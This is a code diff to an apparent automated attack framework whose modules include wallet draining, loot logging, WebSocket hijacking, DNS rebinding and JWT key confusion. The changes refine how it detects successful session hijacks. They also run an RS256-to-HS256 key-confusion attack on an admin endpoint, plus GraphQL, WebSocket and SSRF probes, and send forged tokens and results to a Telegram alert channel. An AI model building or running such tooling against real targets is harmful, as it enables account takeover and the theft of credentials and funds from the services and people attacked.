@@ -40,11 +40,11 @@ from modules.wallet_drain_probe import execute_probe
 from modules.telemetry import stream_proof
 from modules.loot_logger import save_session_loot
 
-# Import the new advanced protocol and cryptographic modules
-from modules.graphql_introspector import run_graphql_introspection
-from modules.websocket_hijacker import run_websocket_audit
-from modules.dns_rebinding import run_dns_rebinding_attack
-from modules.jwt_key_confusion import run_jwt_key_confusion
+# Import the advanced protocol and cryptographic modules
+from modules.graphql_introspector import GraphQLIntrospector
+from modules.websocket_hijacker import audit_websocket
+from modules.dns_rebinding import DNSRebindingOrchestrator
+from modules.jwt_key_confusion import JWTKeyConfusionEngine
 
 # Import the referral validation bypass probe & Autonomous Cognitive Brain
 from modules.test_referral import audit_referral_logic
@@ -229,16 +229,17 @@ def classify_and_adapt(response, current_payload, endpoint="", transport=None, f
             dispatch_tg_alert("Cognitive Autonomous Pivot Success", {"endpoint": endpoint, "evidence": reasoning})
     # ========================================================
 
+    body_lower = body.lower()
     is_spa_shell = (
         "<div id=\"root\"></div>" in body or 
         "<div id=\"__next\"></div>" in body or 
         "<div id=\"app\"></div>" in body or
-        len(body.strip()) < 200
+        (len(body.strip()) < 200 and "token" not in body_lower)
     )
     
-    has_valid_auth_indicator = any(k in body.lower() for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id", "cryptobyte"])
+    has_valid_auth_indicator = any(k in body_lower for k in ["access_token", "\"role\":\"admin\"", "\"user_id\":", "auth_token", "session_id", "cryptobyte"])
     
-    if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body.lower()):
+    if status in [200, 201, 302] and not is_spa_shell and (has_valid_auth_indicator or "token" in body_lower):
         extracted_proof = {}
         try:
             data = json.loads(body)
@@ -310,13 +311,15 @@ def verify_hijacked_session(transport):
         verified = False
         status, headers, body = transport.request("GET", endpoint)
         
-        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body or len(body.strip()) < 350
+        body_lower = body.lower()
+        is_spa_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or "<div id=\"__nuxt\"></div>" in body or (len(body.strip()) < 350 and "user" not in body_lower)
         
         if status == 200 and not is_spa_shell and len(body) > 10:
             verified = True
         else:
             alt_status, alt_headers, alt_body = transport.request("POST", endpoint, payload={})
-            is_alt_spa = "<div id=\"root\"></div>" in alt_body or len(alt_body.strip()) < 350
+            alt_body_lower = alt_body.lower()
+            is_alt_spa = "<div id=\"root\"></div>" in alt_body or (len(alt_body.strip()) < 350 and "user" not in alt_body_lower)
             if alt_status == 200 and not is_alt_spa and len(alt_body) > 10:
                 status, headers, body = alt_status, alt_headers, alt_body
                 verified = True
@@ -610,23 +613,28 @@ async def run_autonomous_engine(target_host=None, credentials_list=None, options
 
     try:
         # Run cryptographic key confusion (RS256 -> HS256 attack)
-        jwt_result = await run_jwt_key_confusion(target_url, session_pool=session_pool)
-        if jwt_result and isinstance(jwt_result, dict) and jwt_result.get("vulnerable"):
+        jwt_engine = JWTKeyConfusionEngine(target_url)
+        jwks = jwt_engine.fetch_public_key("/.well-known/jwks.json")
+        pub_key_mock = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0..." if not jwks else json.dumps(jwks)
+        jwt_success, jwt_token = jwt_engine.verify_and_exploit("/api/admin/settings", pub_key_mock)
+        if jwt_success:
             print(f"\033[91m[!!!] CRITICAL: JWT Key Confusion Vulnerability Confirmed!\033[0m")
-            dispatch_tg_alert("JWT Key Confusion Success", jwt_result)
+            dispatch_tg_alert("JWT Key Confusion Success", {"token": jwt_token})
 
         # Run GraphQL schema introspection & batching fuzzer
-        gql_result = await run_graphql_introspection(target_url)
+        gql_engine = GraphQLIntrospector(target_url)
+        gql_result = gql_engine.run_introspection("/graphql")
         if gql_result:
             dispatch_tg_alert("GraphQL Schema Introspected", gql_result)
 
         # Run WebSocket real-time event stream auditor
-        ws_result = await run_websocket_audit(target_url)
+        ws_result = await audit_websocket(target_url + "/ws")
         if ws_result:
-            dispatch_tg_alert("WebSocket Vulnerability Found", ws_result)
+            dispatch_tg_alert("WebSocket Vulnerability Found", {"target": target_url, "frames": len(ws_result)})
 
         # Run DNS Rebinding / SSRF orchestrator
-        dns_result = await run_dns_rebinding_attack(target_url)
+        dns_orchestrator = DNSRebindingOrchestrator(target_url)
+        dns_result = await dns_orchestrator.execute_rebinding_attack(transport)
         if dns_result:
             dispatch_tg_alert("DNS Rebinding / SSRF Confirmed", dns_result)
     except Exception as exc:
